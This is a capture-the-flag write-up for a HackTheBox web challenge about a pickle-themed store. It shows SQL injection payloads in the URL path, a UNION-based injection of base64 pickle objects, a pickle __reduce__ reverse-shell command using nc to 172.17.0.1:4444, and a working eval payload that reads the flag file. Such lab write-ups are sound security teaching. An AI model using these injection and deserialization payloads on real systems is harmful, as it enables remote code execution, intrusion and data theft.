# HTB-Challenges-Web-COP

## Challenge Description
The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!

![localhost_1337_(Nest Hub Max)](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/999d7d68-5db6-4b8f-b08c-5e9a6186d433)

## Reconnaissance
While scanning the code, two files stood out: **application/models.py** and **application/blueprints/routes.py**. Analyzing the code within these files reveals a concerning vulnerability. The application appears to be using path parameters directly within its SQL queries, without proper validation or sanitization. This practice makes the application highly susceptible to SQL injection attacks (SQLi).
```py
class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')    
```

The application uses the Jinja2 template engine, which is known to be vulnerable to SSTI attacks if not configured correctly. Additionally, before displaying, the data also undergoes processing using Jinja Filters, as indicated by the syntax `{% set item = product | pickle %}`

```jinja
<div class="row gx-4 gx-lg-5 align-items-center">
    {% set item = product | pickle %}
    <div class="col-md-6"><img class="card-img-top mb-5 mb-md-0" src="{{ item.image }}" alt="..." /></div>
    <div class="col-md-6">
        <h1 class="display-5 fw-bolder">{{ item.name }}</h1>
        <div class="fs-5 mb-5">
            <span>£{{ item.price }}</span>
        </div>
        <p class="lead">{{ item.description }}</p>
    </div>
</div>
```

The method of storing data in the database is intriguing. Each row consolidates information into a single field, employing an encoding technique that uses `pickle` and `base64`. This leads to the use of Jinja Filters for decoding the data.

```py
with open('schema.sql', mode='r') as f:
    shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
    get_db().cursor().executescript(f.read().format(*list(shop)))
```

## Scanning
Initially, I conducted a test for SQL injection. It's worth noting that the application employs SQLite, limiting the potential for Remote Code Execution (RCE) in this context.

![localhost_1337_view_%27%20OR%20%271%27%3D%271](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/7f5c3012-f028-4bb7-a379-6e5df22d1c4b)

We successfully injected the payload `' OR '1'='1` or `%27%20OR%20%271%27%3D%271` into the product ID via URL path parameters, allowing us to retrieve the first item. Now, our goal is to display an item that we can control, facilitating testing for Server-Side Template Injection (SSTI) or template injection.

To achieve this, I plan to create a Python script that generates a dictionary with fields similar to those the application uses. Since Jinja accesses both objects and dictionaries using dot notation, a dictionary will suffice. Additionally, I'll encode it in a way that the application can decode and display as intended.

```py
evil_item = {
    "name": "Some name",
    "description": "Some description",
    "price": "100",
    "image": "/static/images/not_found.jpg",
}

print(base64.b64encode(pickle.dumps(evil_item)).decode())
# gASVbgAAAAAAAAB9lCiMBG5hbWWUjAlTb21lIG5hbWWUjAtkZXNjcmlwdGlvbpSMEFNvbWUgZGVzY3JpcHRpb26UjAVwcmljZZSMAzEwMJSMBWltYWdllIwcL3N0YXRpYy9pbWFnZXMvbm90X2ZvdW5kLmpwZ5R1Lg==
```

With the encoded item in hand, my next step is to showcase it in the application. I'll employ the `UNION` technique. Initially, I'll deliberately attempt to fetch non-existent data from the database and then append my encoded object to the result. This ensures that my encoded object becomes the sole data returned by the query.

```sql
' UNION SELECT 'gASVbgAAAAAAAAB9lCiMBG5hbWWUjAlTb21lIG5hbWWUjAtkZXNjcmlwdGlvbpSMEFNvbWUgZGVzY3JpcHRpb26UjAVwcmljZZSMAzEwMJSMBWltYWdllIwcL3N0YXRpYy9pbWFnZXMvbm90X2ZvdW5kLmpwZ5R1Lg==
```
```
%27%20UNION%20SELECT%20%27gASVbgAAAAAAAAB9lCiMBG5hbWWUjAlTb21lIG5hbWWUjAtkZXNjcmlwdGlvbpSMEFNvbWUgZGVzY3JpcHRpb26UjAVwcmljZZSMAzEwMJSMBWltYWdllIwcL3N0YXRpYy9pbWFnZXMvbm90X2ZvdW5kLmpwZ5R1Lg%3D%3D
```

![localhost_1337_view_%27%20UNION%20SELECT%20%27gASVbgAAAAAAAAB9lCiMBG5hbWWUjAlTb21lIG5hbWWUjAtkZXNjcmlwdGlvbpSMEFNvbWUgZGVzY3JpcHRpb26UjAVwcmljZZSMAzEwMJSMBWltYWdllIwcL3N0YXRpYy9pbWFnZXMvbm90X2ZvdW5kLmpwZ5R1Lg%3D%3D](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/25844325-c408-4ac3-b16f-4ab560be673f)

## Exploitation 1 - SSTI *(Failed)*
Now that I have a way to inject a payload that controls the application's dynamic aspects, I can attempt various vulnerabilities to read the flag. The first vulnerability to test is SSTI, so I will create a payload to confirm if the application is susceptible to it.

```py
evil_item = {
    "name": "{{ 7*7 }}",
    "description": "{{ 7*7 }}",
    "price": "{{ 7*7 }}",
    "image": "{{ 7*7 }}",
}
```

Unfortunately for me, it's not.

![localhost_1337_view_%27%20UNION%20SELECT%20%27gASVPAAAAAAAAAB9lCiMBG5hbWWUjAl7eyA3KjcgfX2UjAtkZXNjcmlwdGlvbpRoAowFcHJpY2WUaAKMBWltYWdllGgCdS4%3D](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/592b423b-3ffb-4527-bb7b-61531f661947)

## Exploitation 2 - Reverse Shell via Insecure Deserialization *(Failed)*
A while back, I learned about a vulnerability called *Insecure Deserialization*. This vulnerability varies across programming languages, but the core concept is that during deserialization, specific built-in methods are invoked to create the final output. These methods can be manipulated by attackers to execute arbitrary code.

Since the application seems to be heavily reliant on `pickle`, let's start our investigation there. A quick search for "python pickle vulnerability" led me to this informative blog post: https://davidhamann.de/2020/04/05/exploiting-python-pickle/. This article discusses exploiting the `__reduce__` method to establish a reverse TCP connection.

To the best of my understanding, this vulnerability works by creating a named pipe. A TCP connection writes data to the pipe, and `/bin/sh` reads and executes the received data. This effectively allows remote code execution on the vulnerable system.

```py
class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f')
        return os.system, (cmd,)

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

After ensuring that the test container can run each individual command and connect back to my controlled server, I proceeded to put it to the test. I started a netcat server using the command `nc -lnvp 4444`. This would allow the application to connect to my server and accept commands.

Unfortunately, despite confirming that each individual command worked within the container, the application failed to connect to the server. I tried various reverse shell payloads from the following resource: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md. While the Python payloads functioned within my test environment, they were ineffective in exploiting the actual application.

## Exploitation 3 - Code Evaluation via Insecure Deserialization *(Success)*
To provide further clarification on the `__reduce__` exploit, it's important to understand that `pickle` utilizes its return values in constructing the deserialized object. The initial return value is a callable, and the second is a `tuple` intended to serve as the arguments for the callable. In the typical scenario, it would resemble something like this:

```py
def __reduce__(self):
    return self.__class__, (self.arg_1, self.arg_2,)
```

With this understanding, I can leverage the `eval` function to access the flag and generate a dictionary that the application can then render.

```
class RCE:
    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        return (eval, (self.payload,))

item = RCE("{'name': open('flag.txt', 'r').read()}")

print(base64.b64encode(pickle.dumps(item)).decode())
```

As evident, I've only included the `name` property in the return. To be candid, I'm taking a bit of a shortcut here by not specifying the other properties. I'm hoping that the application won't crash due to these missing details. The final step involves testing the payload against the application.

![localhost_1337_view_%27%20UNION%20SELECT%20%27gASVQgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwmeyduYW1lJzogb3BlbignZmxhZy50eHQnLCAncicpLnJlYWQoKX2UhZRSlC4%3D](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/f7c8a486-69e3-4cb4-8870-3c2f418b2578)

After validating it in a controlled environment, testing the payload against the live application also yields positive results. Flag successfully captured!

## Post-Exploitation
In an actual penetration testing scenario, the true post-exploitation objective often involves acquiring a reverse shell, enabling deeper infiltration into the host or, in more severe cases, the entire network. But that I failed to do.

As a software developer, this serves as a crucial reminder not to accept user input blindly. It emphasizes the importance of diligently sanitizing and implementing various checks tailored to the specific context. While practices may vary across tech stacks, adhering to best practices when it comes to saving and retrieving data is in our best interest.
